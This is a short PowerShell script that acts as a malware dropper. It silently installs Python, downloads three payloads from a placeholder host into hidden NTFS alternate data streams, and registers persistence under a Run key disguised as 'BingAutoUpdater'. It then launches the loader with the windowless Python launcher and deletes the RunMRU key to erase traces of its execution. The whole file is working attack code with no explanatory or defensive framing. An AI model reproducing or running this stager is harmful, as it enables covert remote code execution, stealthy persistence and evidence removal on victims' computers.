# --- Set targeted file to hook other files up to 
$dir = "$env:localappdata\Microsoft"

# --- Download and install python 3.11  
$python = "installation.exe"

iwr "https://www.python.org/ftp/python/3.11.5/python-3.11.5-amd64.exe" -OutFile "$env:localappdata\$python"
Start-Process -Wait -FilePath "$env:localappdata\$python" -ArgumentList "/quiet InstallAllUsers=0 InstallLauncherAllUsers=0 PrependPath=1 Include_test=0 Include_pip=0 Include_tcltk=0"

Remove-Item -Path "$env:localappdata\$python"


# --- Download required files
$url = "NotForDogSausage"
$loader = "loader"

$req = iwr "$url/assets/foo.txt"
Set-Content -Path $dir -Stream $loader -Value $req.content

$req = iwr "$url/assets/foo.txt"
Set-Content -Path $dir -Stream "module" -Value $req.content

$req = iwr "$url/assets/foo.txt"
Set-Content -Path $dir -Stream "core" -Value $req.content


# --- Add file to autostart and start a python process
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "BingAutoUpdater" -Value "$env:localappdata\Programs\Python\Launcher\pyw.exe -3.11 ${dir}:$loader" -Type String
Start-Process -FilePath "$env:localappdata\Programs\Python\Launcher\pyw.exe" -WorkingDirectory $env:localappdata -ArgumentList "-3.11 ${dir}:$loader"


# --- Clean up
$MRU = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"

if (Test-Path -Path $MRU) {
  Remove-Item -Path $MRU -Recurse
}